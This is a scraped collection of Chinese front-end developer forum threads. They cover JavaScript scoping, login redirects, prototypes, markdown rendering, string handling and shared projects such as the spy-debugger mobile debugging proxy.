{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>如题，有这么一个问题，前后端分离，<strong>nginx location / <strong>为</strong>index.html</strong>,用户访问 <a href=\"http://xxx.com\" rel=\"nofollow\">xxx.com</a> 时 index.html 里的 javascript 进行判断用户是否登录，未登录则<strong>跳转到 login.html</strong>。</p>\n<p>那么问题来了，因为有一个判断是否登录的过程，所以访问首页时在跳转前会<strong>先显示出后台的内容</strong>，虽然这个过程<strong>不到 1s</strong>就跳到 login.html,请教这有什么办法<strong>不显示后台内容就直接重定向</strong>呢？谢谢</p>\n</div></div>"], "reply": "13", "tittle": "前后端分离时 js 如何优雅的重定向", "comment": ["前后端分离了，还不用 单页应用 的方式？", "你判断登录之后再渲染 index 的内容呗。", "为什么 要用 js 来判断用户是否登陆？ 可以 让 nginx 直接判断的。", "前后端分离也没必要把 html 分出去，一般 html 还是放在后端会比较有好处", "针对你的场景，推荐加一个 main.html, 在这里负责页面的跳转，登陆就到 index ，否则到 login", "难道最简单的办法不是在 Index 的 head 里面写一小段 JS 判断么", "项目有没用前端框架？ Vue 有 v-cloak 的指令，类似 Angular 中的 ng-cloak ，可以在状态出来前隐藏页面元素。", "会有安全问题", "判断结果返回成功之前，先隐藏掉，成功之后显示，反之跳转", "1. 先判断有没有登录\r", "2. 然后再到后台获取数据", "我这里 Angular ，是在 html 里写一个 loading ，所有资源加载完，再在 Angular 控制器里隐藏掉 loading ，使用 ng-if 控制 ui-router 的 ui-view 。\r", "\r", "不过这个事情，其实最好是在后端做，后端根据登场情况，来确定输出的 html 内容。", "既然都前后端分离了，为什么 login 页面还要单独弄一个 login.html 文件呢？路由可以直接去拦截重和定向啊，登录逻辑和业务逻辑都打包到同个 js 文件里去，这样就不会把后台内容显示出来了", "有的路由可以手动执行回调函数时才显示页面"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>我是 java 转过来的前端小白，目前前端只能切下图、用 JQ 做下数据交互、改一下网页模板、用 Vue 做下页面渲染。\n我想更深入、系统的学习前端知识，我是去看妙味课堂系统的教学视频好 还是自己看菜鸟教程自己动手？因为还有 3-4 个月就春招了，想在这个方面有点技术积累。</p>\n</div></div>"], "reply": "7", "tittle": "前端初级入门 是 看妙味课堂视频好还是看菜鸟教程", "comment": ["\r", "\r", "看看这个吧", "有时间就妙味课堂，没时间就菜鸟教程+书籍", "简单学点 nodejs, 然后搭个网站, 随便什么功能, 然后尽可能的像正式项目那样运营一下", "MDN", "先学写简历……\r", "然后再学做 todo list", "情况和楼主一样...来加个好友?"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><pre><code>var a = [];\nfor (var i = 0; i &lt; 10; i++) {\n  a[i] = function () {\n    console.log(i);\n  };\n}\na[6](); // 10   \n</code></pre>\n<pre><code>var a = [];\nfor (let i = 0; i &lt; 10; i++) {\n  a[i] = function () {\n    console.log(i);\n  };\n}\na[6](); // 6\n</code></pre>\n<p>想不明白了, 谁能帮忙解释下这是为啥呢?</p>\n</div></div>"], "reply": "31", "tittle": "var 和 let 的区别?", "comment": ["我刚看了这个，因为 var 的作用域只能是函数和全局，而 let 是块，也就是{}，所以对于 let ， for 循环一次， i 就在那个循环里起作用而已。", "你或许需要一本 exploring es6", "总是喜欢把事情搞得这么复杂，所以一点都不喜欢了 js", "用 var ，每个 function 都保存着 i 的同一个变量对象，为 10 。\r", "用 let ，是块级作用域，每次的 i 是独立的，大概是这样吧。", " 用 var 声明的话数组里面存的是 [ funciton(){console.log(i)},  funciton(){console.log(i)}...]\r", "用 let 声明数组里面的即是[ function(){console.log(\"1\")}, function(){console.log(\"2\")} ....]?", " 我就是看到这个没有看明白的...", " 不是很准确，可以理解为这样[{let i=0;}, {let i =1}]， i ++之后就新起一个块。", "你应该这样理解\r", "本来不应该有 var 和 let 的\r", "因为他们其实除了作用域以外没有任何区别\r", "但由于历史原因， var 的作用域泄露的问题被吐槽太多了，又不得不兼容，所以才产生了 let\r", "\r", "js 三种变量声明方式\r", "\r", "x;\r", "var x;\r", "let x;\r", "\r", "如果可以用更合适的关键字修饰符的话，就是等同于\r", "global x; (前提是变量没有在任何作用域中被定义)\r", "function local x;\r", "local x;", "作用域的区别， let 只在当前循环或函数里有效，这等同于再函数里 var 了一样。", "````\r", "var tmp = new Date();\r", "\r", "function f() {\r", "  console.log(tmp);\r", "  if (false) {\r", "    var tmp = \"hello world\";\r", "  }\r", "}\r", "\r", "f(); // undefined\r", "````\r", "又来个问题, 自学真的很不行是不是, 求老司机带带 付费指导", "因為 var 的變量聲明會被提前,\r", "先這樣處理後, 再來看問題就會比較容易理解.\r", "\r", "\r", "```\r", "var a = [];\r", "var i;\r", "for ( i = 0; i < 10; i++) {\r", "    a[i] = function () {\r", "        console.log(i);\r", "    };\r", "}\r", "a[6](); // 10 \r", "```\r", "\r", "\r", "```\r", "var tmp = new Date(); \r", "\r", "function f() { \r", "    var tmp;\r", "    console.log(tmp); \r", "    if (false) { \r", "        tmp = \"hello world\"; \r", "    } \r", "} \r", "\r", "f(); // undefined \r", "\r", "```", "作用域，变量提升。", "可以看看《你不知道的 javascript 》 第一卷 1 ， 2 ， 3 ， 4 章", "建议楼主先学一下基础知识再去学 ES6 相关改进。", " 其实不是复杂 是由于大量的历史包袱 JS 一开始设计的不好 然后修修改改 导致这样的问题", " 所以两者不要混用\r", "let 是 block scope 和大多数语言一样 所以最近才出现 减少问题的发生\r", "var 是 function scope 由于历史原因 对于很多人来说 非常容易混淆\r", "\r", "所以你能用 let 的情况下 只用 let\r", "如果你要考虑浏览器兼容性的情况下 就只用 var\r", "不要混用 把自己搞糊涂", "难道不是还有一个 const 么。。。。所以一共是四种修饰方式么？ var, let, const, 和空。。。", " [第 723 期] ES6 中 的 var 、 let 和 const 应该如何选择？\r", "前端早读课： ", "\r", "\r", "\r", "目前 var 和 let 没任何区别 本来我以为 babel 会把 let 的变量都搞到函数里隔绝作用域 结果如果没重名的话就是把 var 改成 let\r", "如果有重名就在 let 的变量下家个下划线。。", "for (var i = 0; i < 10; i++) console.log(i);\r", "i -> 10\r", "for (let i = 0; i < 10; i++) console.log(i);\r", "i -> undefined", "你需要看\r", "let 这玩意是不是出自 lisp", "13 楼正解，就这两点。", " \r", "\r", "实际用下来感觉 var 的变量提升就是一个需要注意的坑，想不到除了作为面试题还有什么场合能用得上…所以 babe 这么做也没什么不对 233", "补充一下我 8 楼说的，楼主是否明白了呢，执行下下面的代码。\r", "\r", "for(let i = 0;i < 3;i ++) {\r", "  a[i] = function () {console.log(i);}\r", "  setTimeout(function () {i = i * 1000}, 1000);\r", "} \r", "\r", "a[1]() // 1000\r", "a[2]() // 2000", " \r", "你把楼主用 let 的语法用 babel 转了试试，通过新建一个 loop 函数的确给了 i 作用域，得到也是期望的结果；改名能避免变量提升带来的问题，这样做没问题。例如: \r", "{ let a = 'a'  } console.log(a)\r", "会被编译成\r", "{ var _a = 'a' } console.log(a)\r", "你得到的结果和你在支持 let 语法的宿主环境中一样。\r", "\r", "而且有些情况根本不需要编译，例如写 electron 和 node 。准确来说你应该说对你没区别。", "自从有了 let 之后，好像提倡不要用 var 了，绝大多数情况下用 let 就够了。如果一时之间觉得比较乱，建议不要去管 var ，只管用 let 就好了，没有必要执着于两者的区别（过一段时间回头看很可能会豁然开朗）。", "var 与 let\r", "\t- let 是更完美的 var 。\r", "\t- let 声明的变量拥有块级作用域。\r", "\t- let 声明的全局变量不是全局对象的属性。\r", "\t- 形如 for(let I …) 的循环在每次迭代时都为 I 创建新的绑定。\r", "\t- let 声明的变量直到控制流到达该变量被定义的代码行时才会被装载，所以在到达之前使用该变量会触发错误。不可访问的这段时间变量一直处于作用域中，但是尚未装载，它们位于临时死区(Temporal Dead Zone)中。\r", "\t- 用 let 重定义变量会抛出一个语法错误。", "要理解这个，首先要理解词法作用域。\r", "\r", "* 定义一个函数的时候，函数会保存当前作用域\r", "* 函数执行的时候，会创建一个新的作用域，用于存放函数参数和局部变量，同时新的作用域指向函数保存的作用域，构成作用域链\r", "\r", "因此，第一个例子中，由于没有块级作用域，循环里的所有函数都是共享同一个作用域的， a[0] == a[1] == ... == a[9] == i == 10 。\r", "\r", "第二个例子中，有块级作用域，等价于：\r", "\r", "```js\r", "var a = [];\r", "for (var i = 0; i < 10; i++) {\r", "  (function(i) {\r", "    a[i] = function() {\r", "      console.log(i);\r", "    };\r", "  })(i);\r", "}\r", "a[6](); // 6\r", "```\r", "\r", "通过查看 babel 的转换也可以看出：\r", "\r", "\r", "不明白问我，付费指导。", "IIFE"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>代码如下</p>\n<pre><code>   class MyCoolArray extends Array {\n          first() { return this[0];}\n       }\n     var a = new MyCoolArray(1,2,3);\n     console.log(a.first());// get error 'a.first is not a function'\n</code></pre>\n<p>谁知道为什么 first 无法执行？谢谢</p>\n<p>babel 在线 <a href=\"https://babeljs.io/repl/#?babili=false&amp;evaluate=true&amp;lineWrap=false&amp;presets=es2015%2Ces2015-loose%2Ces2016%2Ces2017%2Clatest%2Creact%2Cstage-0%2Cstage-1%2Cstage-2%2Cstage-3&amp;code=class%20MyCoolArray%20extends%20Array%20%7B%0A%20%20first()%20%7B%20return%20this%5B0%5D%3B%7D%0A%20%7D%0A%0Avar%20a%20%3D%20new%20MyCoolArray(1%2C2%2C3)%3B%0A%0A%0Aconsole.log(a.first())%3B\" rel=\"nofollow\">https://babeljs.io/repl/#?babili=false&amp;evaluate=true&amp;lineWrap=false&amp;presets=es2015%2Ces2015-loose%2Ces2016%2Ces2017%2Clatest%2Creact%2Cstage-0%2Cstage-1%2Cstage-2%2Cstage-3&amp;code=class%20MyCoolArray%20extends%20Array%20%7B%0A%20%20first()%20%7B%20return%20this%5B0%5D%3B%7D%0A%20%7D%0A%0Avar%20a%20%3D%20new%20MyCoolArray(1%2C2%2C3)%3B%0A%0A%0Aconsole.log(a.first())%3B</a></p>\n</div></div>"], "reply": "3", "tittle": "Babel 编译 ES6 的 class extends Array 时，无法获取方法，求助", "comment": ["Array 是不能直接继承的。 这是个特例 。\r", "super 呢", " 先谢谢，还没细看，奇怪的是我可以打印 a 和 a.length ，只是不能使用里面的方法"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>使用了这个<a href=\"https://github.com/chjj/marked\" rel=\"nofollow\">库</a>，可以将 markdown 的文本转化为 html ，大概的用法是这样的</p>\n<pre><code>&lt;!doctype html&gt;\n&lt;html&gt;\n&lt;head&gt;\n  &lt;meta charset=\"utf-8\"/&gt;\n  &lt;title&gt;Marked in the browser&lt;/title&gt;\n  &lt;script src=\"lib/marked.js\"&gt;&lt;/script&gt;\n&lt;/head&gt;\n&lt;body&gt;\n  &lt;div id=\"content\"&gt;&lt;/div&gt;\n  &lt;script&gt;\n    document.getElementById('content').innerHTML =\n      marked('# Marked in browser\\n\\nRendered by **marked**.');\n  &lt;/script&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre>\n<p>我现在网站目录下有个 <a href=\"http://test.md\" rel=\"nofollow\">test.md</a> 的文件，有相关的库，直接读取 <a href=\"http://test.md\" rel=\"nofollow\">test.md</a> ，之后转化成 html 吗</p>\n</div></div>"], "reply": "7", "tittle": "markdown 转 html", "comment": ["ajax", "不妨试一试这个。\r", "\r", "Markdown 实现菜单的方法\r", "\r", "原文地址：\r", "\r", "\r", "// 安装 \r", "sudo gem install tocmd \r", "// 指定单个文件\r", " sudo tocmd_local -f xx.md \r", "// 指定目录 \r", "sudo tocmd -d .", "有的 showdown.js  ", "我去，忽略上条，你要生成 html 得找个服务端的 markdown 工具 看看有没有直接的 api 不然就先读取文本到 string 再转 java 的话有 pegdown 去 github 上搜搜应该都有。", "python 里面有个 markdown 模块可以\r", "browser 中有很多 js 可以完成转化，\r", "如果是服务端的转换可以考虑 nodejs 或 phantomjs 在服务器上调用命令行实现，\r", "另外 pandoc 支持此类转换", "可以用 node+express ， ajax 请求然后把 md 放进去"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>请移步至 <a href=\"https://zhuanlan.zhihu.com/p/23804247\" rel=\"nofollow\">https://zhuanlan.zhihu.com/p/23804247</a></p>\n<p>考虑到 V2 好长时间没有什么技术相关的文章，就搬运一篇最近的文章过来讨论讨论。</p>\n<p>最近两个月我在知乎上写了一系列的前端科普文章，水平一般，大家喜欢的话就关注下。</p>\n<p>GitHub ： <a href=\"http://github.com/frankfang\" rel=\"nofollow\">github.com/frankfang</a>\n知乎： <a href=\"https://www.zhihu.com/people/zhihusucks/activities\" rel=\"nofollow\">https://www.zhihu.com/people/zhihusucks/activities</a></p>\n</div></div>", "<div class=\"topic_content\"><div class=\"markdown_body\"><p><a href=\"https://zhuanlan.zhihu.com/p/23700861\" rel=\"nofollow\">前端书籍推荐</a></p>\n<p><a href=\"https://zhuanlan.zhihu.com/p/23090041\" rel=\"nofollow\">什么是JS原型链</a></p>\n<p><a href=\"https://zhuanlan.zhihu.com/p/22486908\" rel=\"nofollow\">什么是JS闭包</a></p>\n</div></div>", "<div class=\"topic_content\">感谢的不用回复啦，点「感谢」就好。</div>"], "reply": "21", "tittle": "[教程] JS 里的 this 到底是什么？", "comment": ["正在学 js ，多谢！", "这篇写的好，通俗易懂，没有废话", " 谢谢。 不过其实我觉得废话还是较多的，有些重要的地方故意说两边。", "这帖子多长时间才能 append ……", "为什么这帖子发了两遍，请删除另一篇  @", "   ", "华科的学弟来膜一下~_~", "通俗易懂，支持楼主。\r", "建议再介绍一下箭头函数的情况，这个应该没法用 function.call 解释了。", " 箭头函数就是 function.bind 嘛", "收藏，感谢。", " 希望能有一点帮助", "感谢分享", "\"考虑到 V2 好长时间没有什么技术相关的文章\" \r", "\r", "感觉 v2 不是聊技术，是用来灌水的 ...", " 两年前没这么水的……", " 箭头函数压根没有 this ，也没有用 bind 改变 this 一说。", "原来方应杭就是你啊", " 隐藏这么久被你发现了", " \r", "(arg) => {exp;}\r", "function (arg) {exp;}.bind(this)\r", "这二者效果相同。当然你要追究其里那确实不一样，不过也无非是强制绑定了上下文以及无法`new`而已", " 你们俩好像是一个意思", " 大概是对同一件事的不同视角导致的不同观点", "其实这些问题，看完 You Don't Know JS 这个 series 基本都搞定了，不需要看文章", "看了一半，回来支持下：)"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><a href=\"https://github.com/MarkoCen/Benthos\" rel=\"nofollow\">Benthos.js</a></p>\n<p>最近工作中需要大量测试数据，所以用 ES6 写了上面这个库， 此库可以在浏览器或者 node 环境中使用</p>\n<p>目前只支持英文数据，欢迎 PR</p>\n</div></div>"], "reply": "目前尚无回", "tittle": "ES6 版测试数据生成库", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>有如下数据：</p>\n<p>2016/11/1&amp;2016/11/2&amp;2016/11/4&amp;2016/11/6&amp;2016/11/8&amp;2016/11/10&amp;2016/11/12&amp;2016/11/14&amp;2016/11/9</p>\n<p>在实际环境中，每段 yyyy/mm/dd 的长度是不确定的，可能还会夹杂一些数据，这里只是简单的例子。现在要匹配出：</p>\n<p>2016/11/2&amp;2016/11/4&amp;2016/11/6&amp;2016/11/8&amp;2016/11/10&amp;2016/11/12&amp;2016/11/14&amp;2016/11/9</p>\n<p>如何用正则表达式匹配出“第一个 &amp; 后面不包含这个 &amp; 的所有字符串”？</p>\n<p>PS ：用什么原生的方法能不用正则也能达到同样效果？</p>\n</div></div>", "<div class=\"topic_content\">抱歉，表达不清晰，谢谢各位指出和解答，问题的正确描述就是 @<a target=\"_blank\" href=\"/member/Yuguo\">Yuguo</a> 说的：\r<br>如何截取字符串，得到第一个指定字符之后的字符串（不含该字符）？</div>"], "reply": "14", "tittle": "Javascript 如何截取字符串中，第一个指定字符后面不包含这个字符的所有字符？", "comment": ["没看懂你的意思，“第一个 & 后面不包含这个 & 的所有字符串”是指 第一个$后面的所有字符串，但是不以$开头是吗", "s.replace(/(.*?)&/,\"\")\r", "\r", "不用正则：\r", "\r", "let index = s.indexOf('&');\r", "s = s.substr(index+1);", "你这匹配出来的难道不是偶数？", "str.substr(str.indexOf(\"&\")).replace(/&/g,\"\")      这种效果？", "楼主表达不清楚，我猜测可能意思是：\r", "\r", "JavaScript 如何截取字符串，得到第一个指定字符之后的字符串（不含该字符）？", "split slice join", "我的理解是 str.split('&')[1]就行了……", "`/&([^&]+)/`", "(?<=&)[^&]*\r", "这样吗?\r", "获取&后面的字符串，但是不包含这个&并且不含有后面一个&\r", "比如&2016/11/4&2016/11/6&\r", "得到的是 2016/11/4 和 2016/11/6", "split 不行么...", " 是的，谢谢指出", "`&([^&]*)`", "虽然问题表述不完美，但是所给出的想要的输出结果已经足以说明楼主的意图了。认真看主帖的话，对题意应该不会有什么不明白。", "let \"2016/11/1&2016/11/2&2016/11/4&2016/11/6&2016/11/8&2016/11/10&2016/11/12&2016/11/14&2016/11/9\"\r", "\r", "let tempArr = str.split(\"&\")\r", "\r", "tempArr.splice(0,1)\r", "\r", "let result = tempArr.join('&')\r", "\r", "\r", "\r"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><h1>关于 spy-debugger</h1>\n<p>一站式页面调试、抓包工具。远程调试任何手机浏览器页面，任何手机移动端 webview （如：微信， HybirdApp 等） HTTP/HTTPS<br>\n<a href=\"https://github.com/wuchangming/spy-debugger/network\" rel=\"nofollow\"><img alt=\"GitHub forks\" src=\"https://img.shields.io/github/forks/wuchangming/spy-debugger.svg\"></a><a href=\"https://github.com/wuchangming/spy-debugger/stargazers\" rel=\"nofollow\"><img alt=\"GitHub stars\" src=\"https://img.shields.io/github/stars/wuchangming/spy-debugger.svg\"></a><br>\n项目地址： <a href=\"https://github.com/wuchangming/spy-debugger\" rel=\"nofollow\">https://github.com/wuchangming/spy-debugger</a></p>\n<h4>新增功能：<strong>页面编辑模式</strong></h4>\n<blockquote>\n</blockquote>\n<p>效果图：\n<img alt=\"spy-debugger-w.gif\" src=\"//dn-cnode.qbox.me/Fsjg4CJ-XMUHcxrQomZSl8Y4qd1o\"></p>\n<h2>特性</h2>\n<blockquote>\n</blockquote>\n<p>1 、页面调试＋抓包<br>\n2 、<a href=\"#%E4%B8%89%E5%88%86%E9%92%9F%E4%B8%8A%E6%89%8B\" rel=\"nofollow\">操作简单</a><br>\n3 、<strong>支持 HTTPS</strong>。<br>\n4 、<code>spy-debugger</code>内部集成了<a href=\"http://people.apache.org/%7Epmuellr/weinre/docs/latest/\" rel=\"nofollow\"><code>weinre</code></a>、<a href=\"https://github.com/wuchangming/node-mitmproxy\" rel=\"nofollow\"><code>node-mitmproxy</code></a>、<a href=\"https://github.com/alibaba/anyproxy\" rel=\"nofollow\"><code>AnyProxy</code></a>。<br>\n5 、自动忽略原生 App 发起的 https 请求，只拦截 webview 发起的 https 请求。对使用了 SSL pinning 技术的原生 App 不造成任何影响。<br>\n6 、可以配合其它代理工具一起使用(默认使用 AnyProxy) [(设置外部代理)](#设置外部代理默认使用 anyproxy)</p>\n<h2>三分钟上手</h2>\n<blockquote>\n</blockquote>\n<p>第一步：手机和 PC 保持在同一网络下（比如同时连到一个 Wi-Fi 下）</p>\n<blockquote>\n</blockquote>\n<p>第二步：命令行输入<code>spy-debugger</code>，按命令行提示用浏览器打开相应地址。</p>\n<blockquote>\n</blockquote>\n<p>第三步：设置手机的 HTTP 代理，代理 IP 地址设置为 PC 的 IP 地址，端口为<code>spy-debugger</code>的启动端口(默认端口： 9888)。</p>\n<blockquote>\n</blockquote>\n<p>第四步：手机安装证书。<strong>注：手机必须先设置完代理后再通过(非微信)手机浏览器访问<code><a href=\"http://spydebugger.com/cert\" rel=\"nofollow\">http://spydebugger.com/cert</a></code><a href=\"demo/img/QRCodeForCert.png\" rel=\"nofollow\"><code>(地址二维码)</code></a>安装证书</strong>（手机首次调试需要安装证书，已安装了证书的手机无需重复安装)。</p>\n<blockquote>\n</blockquote>\n<p>第五步：用手机浏览器访问你要调试的页面即可。</p>\n<h2>自定义选项</h2>\n<h4>端口</h4>\n<blockquote>\n</blockquote>\n<p>(默认端口： 9888)</p>\n<pre><code>spy-debugger -p 8888\n</code></pre>\n<h4>设置外部代理（默认使用 AnyProxy ）</h4>\n<blockquote>\n</blockquote>\n<pre><code>spy-debugger -e http://127.0.0.1:8888\n</code></pre>\n<p>spy-debugger 内置 AnyProxy 提供抓包功能，但是也可通过设置外部代理和其它抓包代理工具一起使用，如： Charles 、 Fiddler 。</p>\n<h4>设置页面内容为可编辑模式</h4>\n<blockquote>\n</blockquote>\n<p>该功能使页面内容修改更加直观方便。\n(默认： false)</p>\n<pre><code>spy-debugger -w true\n</code></pre>\n<p>内部实现原理：在需要调试的页面内注入代码：<code>document.body.contentEditable=true</code>。暂不支持使用了 iscroll 框架的页面。</p>\n<h4>是否允许 weinre 监控 iframe 加载的页面</h4>\n<blockquote>\n</blockquote>\n<p>(默认： false)</p>\n<pre><code>spy-debugger -i true\n</code></pre>\n<h4>是否只拦截浏览器发起的 https 请求</h4>\n<blockquote>\n</blockquote>\n<p>(默认： true)</p>\n<pre><code>spy-debugger -b false\n</code></pre>\n<p>有些浏览器发出的 connect 请求没有正确的携带 userAgent ，这个判断有时候会出错，如<strong>UC 浏览器</strong>。这个时候需要设置为 false 。大多数情况建议启用默认配置： true ，由于目前大量 App 应用自身（非 WebView ）发出的请求会使用到 SSL pinning 技术，自定义的证书将不能通过 app 的证书校验。</p>\n<h4>是否允许 HTTP 缓存</h4>\n<blockquote>\n</blockquote>\n<p>(默认： false)</p>\n<pre><code>spy-debugger -c true\n</code></pre>\n<h2>更多</h2>\n<p><code>spy-debugger</code>原理是集成了<code>weinre</code>，简化了<code>weinre</code>需要给每个调试的页面添加 js 代码。<code>spy-debugger</code>原理是拦截所有 html 页面请求注入<code>weinre</code>所需要的 js 代码。让页面调试更加方便。</p>\n</div></div>"], "reply": "9", "tittle": "工具分享：移动端真机页面调试工具 spy-debugger 新增功能——页面编辑模式", "comment": ["赞～", "6666666666666", " \r", " \r", "谢谢～", "mark 一下", "mac 下的安装指令把 sudo 去掉吧， npm 可以不需要 sudo 的，这样避免的权限错乱\r", "如果有用户需要 sudo ，让他们自己看错误提示再加", " ，安装到全局是需要的吧？", "额，不知道大家的习惯，一般大家都 sudo chown -R who:admin /usr/local 了吧？\r", "意思是文档中还是去掉（基本也没看见 -g 的组件文档写上 sudo ）的，有需要的人他们自己再加", "试用后，使用起来方便了很多", " 谢谢支持。"]},
{"content": ["<div class=\"topic_content\">var a = \"8606454o056985060p072405880643074o0p2546098m4o0p4o0707074o0p06a74n078n471oc046434o4893084p090p0p9o1p45170p0n064p464o26260p446p46804p0p09060p0607560o06184848454646\";\r<br>//var b= parseInt(a, 10);\r<br>G = function(a, b) {\r<br>  var c = function(a) {\r<br>    for (var b, c = [], d = 3, e = function(a) {\r<br>          return a &gt;= \"0\" &amp;&amp; \"9\" &gt;= a ? parseInt(a, 10) : a.charCodeAt(0) - \"a\".charCodeAt(0) + 10\r<br>        }, f = function(a, b) {\r<br>          var c, d, f, g, h;\r<br>          //c =e 函数\r<br>          return c = e(a[b]), d = e(a[b + 1]), d = 15 &amp; d, f = (12 &amp; c) &gt;&gt; 2, g = (2 &amp; c) &gt; 0, h = (1 &amp; c) &gt; 0, {\r<br>            value: d, //d=e 函数\r<br>            winner: f, // f = (12 &amp; c)\r<br>            playerPair: g, //g=(2&amp;c)\r<br>            bankerPair: h // h = (1 &amp; c) &gt; 0\r<br>          }\r<br>        },\r<br>        g = 0; g &lt; a.length - 1; g += 2)\r<br>      b = f(a, g), b.winner !== d ? c.push(b) : c = [];\r<br>    return c\r<br>  };\r<br>  if (!a || void 0 === b) return [];\r<br>  switch (a) {\r<br>    case \"7bal\":\r<br>    case \"bal\":\r<br>      return c(b);\r<br>    case \"rol\":\r<br>    case \"rofl\":\r<br>      return b.split(\";\").map(function(a) {\r<br>        return {\r<br>          result: a\r<br>        }\r<br>      });\r<br>    default:\r<br>      return b\r<br>  }\r<br>}\r<br>\r<br>document.write(G(\"bal\", a));\r<br>\r<br>可以的联系我 Q 1069689491</div>"], "reply": "目前尚无回", "tittle": "付费 3 个毛爷爷把一段 javascript（ 30 多 行，作用是解析一段字符串为对象） 代码转成 C# 版本", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><h1>前端开发者专用的 PPT 制作页面</h1>\n<p>示例： <a href=\"https://frankfang.github.io/wtf-slides/%E7%A4%BA%E4%BE%8B.html\" rel=\"nofollow\">https://frankfang.github.io/wtf-slides/示例.html</a> （右键查看源代码就会写了）</p>\n<h2>使用方法</h2>\n<ol>\n<li>Fork 本项目</li>\n<li>复制 <code>_template.html</code> 到 <code>我的 PPT.html</code></li>\n<li>在 <code>&lt;section&gt;</code> 里面写 HTML</li>\n<li>用浏览器打开 <code>我的 PPT.html</code></li>\n</ol>\n<h2>如果你想分享给别人看</h2>\n<ol>\n<li>开启你项目的 GitHub Page （分支选择 master ）</li>\n<li>把链接放给他</li>\n<li>祈祷他没有使用 IE</li>\n</ol>\n</div></div>"], "reply": "10", "tittle": "wtf-slides，又一个很无聊的项目", "comment": ["1. 你的托管 404 了\r", "2. 没看出来这个和其他的 slidejs 库有啥区别……", "build 不是因为我是前端，是前端也不是终身 HTML 相伴，终身 HTML 相伴也不能只从井底往上看。", " 这个可以", " 名字带了 wtf ，就是自嘲了。\r", "\r", "现在不 404 ，区别你右键查看源码看看能不能感受到，那一丝丝区别。。。", "样式会晚好久才加载？", " 这个不重要啊，毕竟你演示要更久，你必然会提前打开页面的", " 收藏个先 w", "最后一个想当然的理解为 Like Me? F**k me...", " 你的理解是对的"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><a href=\"https://github.com/wepyjs/wepy\" rel=\"nofollow\">https://github.com/wepyjs/wepy</a></p>\n<p>目前自己业务基于 wepy 开发了一套完整的 DEMO ，在安卓和 IOS 上均跑通测试过。</p>\n<p>大家看看有啥想法，是否值得使用呢？</p>\n</div></div>"], "reply": "13", "tittle": "总结出的一套小程序的组件化开化框架", "comment": ["不错，支持一下", "Cool, 有同样的想法。", " 那可以体验一下，看有什么需要改进的地方", "觉得开发流程复杂化了", " 这个是肯定的，肯定是要一定学习成本，就得看，学习成本跟开发收益是否成正比，如果收益更大，我觉得对比原生复杂一点也是值得的。", " 如果业务有量产需求的话，是可以的做框架、流程规范。\r", "如果业务单一的话，考虑到后续成员的学习成本，就不宜引入过于复杂的第三方框架或构建工具了", "前排帮顶~", " 感谢屈大捧场。", "风格好像很像 VUE 啊，正好符合我的胃口。再加上 async/await 。真是不错。", " 嗯嗯，是的，主要是参考了 ng 和 vue.", "methods 为什么要用对象存?", "学习~", " 没太明白这里？\r", "methods.主要用于响应页面 bind 的事件所作的区分。"]},
{"content": ["<div class=\"topic_content\">最近写组件的时候发现原生的一些方法不太习惯，自己定义一些函数写起来也不是很方便\r<br>比如\r<br>var array=new Array(); \r<br>var json=get(array,y);\r<br>想写成\r<br>var json=array.get(y);\r<br>应该有一种写法是直接实现 Array 的方法，不过写法找了半天也没找到，求解惑。</div>"], "reply": "15", "tittle": "js 原生对象如何实现自定义方法？", "comment": ["\r", "\r", "prototype", "prototype\r", "\r", "Array.prototype.get = function(idx){\r", "}", "``` javascript\r", "function Person(name) {\r", "  this.name = name;\r", "  this.age = 12;\r", "};\r", "Person.prototype.getName = function ()　{\r", "  return this.name;\r", "};\r", "var per = new Person('zhangsan');\r", "var oName = per.get();\r", "console.log(oName);\r", "```\r", "是这种形式么？", "因为 js 是基于原型链的， 在对象的 prototype 属性上附加声明即可。\r", "\r", "Array.prototype.get= function(val){\r", "    // this[??] = val;\r", "    // ...\r", "    // var json = eval(this);\r", "    // return json;\r", "}", "你可以包装一个类，内部一个 private 的数组容器，提供各种方法", "修改原生对象的这种做法，一般不推荐", "修改原生对象太容易出问题，自己写个封装类吧\r", "\r", "class MyArray {\r", " constructor(arr) {\r", "   this.arr = arr\r", " }\r", "}", "这种 polyfill 的形式非常非常不推荐", "- 同楼上，不赞成这种 polyfill 的形式\r", "- 如果只是封装了两行逻辑的话，你要考虑到时候是写两行方便点还是导入包来解决方便点\r", "- 先考虑原生是否已经提供方便的方法，或者能否使用如 lodash 之类的库", "这种需求不是应该用继承吗？", "es6 用 class MyArray extends Array {}\r", "es5 用 Array.prototype.myMethod = function() {}", "搞 js 的不知道原型？", "*不推荐修改原生对象的 prototype ，这不仅可能会造成后期匪夷所思的问题，还会对维护增加负担*", "#2 是对的, 内部实现自定义就可以了, 只要是 Array 实例都可以调用, 然后首行增加实例类型判断就基本没什么问题了", "建议你看看 JS 中的原型（ prototype ）和原型链（__proto__）,但是修改原生的方法有的时候会出现问题，建议加一个自定义的，不和原生方法重复的名字。"]},
